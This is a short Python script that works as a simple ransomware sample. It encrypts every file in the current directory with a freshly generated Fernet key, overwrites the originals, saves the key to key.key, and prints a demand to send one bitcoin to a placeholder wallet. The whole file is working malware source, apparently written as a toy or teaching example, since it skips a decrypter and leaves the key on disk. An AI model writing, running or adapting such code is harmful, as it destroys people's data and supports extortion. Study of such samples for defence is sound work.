#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet 

exclude=["encrypter.py", "decrypter.py", "key.key", "README.md"]

def list_files(exclude):
    archives = [file for file in os.listdir() if os.path.isfile(file) and file not in exclude]
    return archives

def generate_encryption_key(file_name="key.key"):
    key = Fernet.generate_key()
    with open(file_name, "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_files(key, exclude):
    fernet = Fernet(key)
    files = list_files(exclude)

    for file in files:
        with open(file, "rb") as target:
          content = target.read()
        encrypted_content = fernet.encrypt(content)

        with open(file, "wb") as target:
            target.write(encrypted_content)

encrypt_files(generate_encryption_key(), exclude)

print("\033[31mYour files got encrypted!! Pay to get your data back, send 1 bitcoin to wallet abcdefg.\033[0m")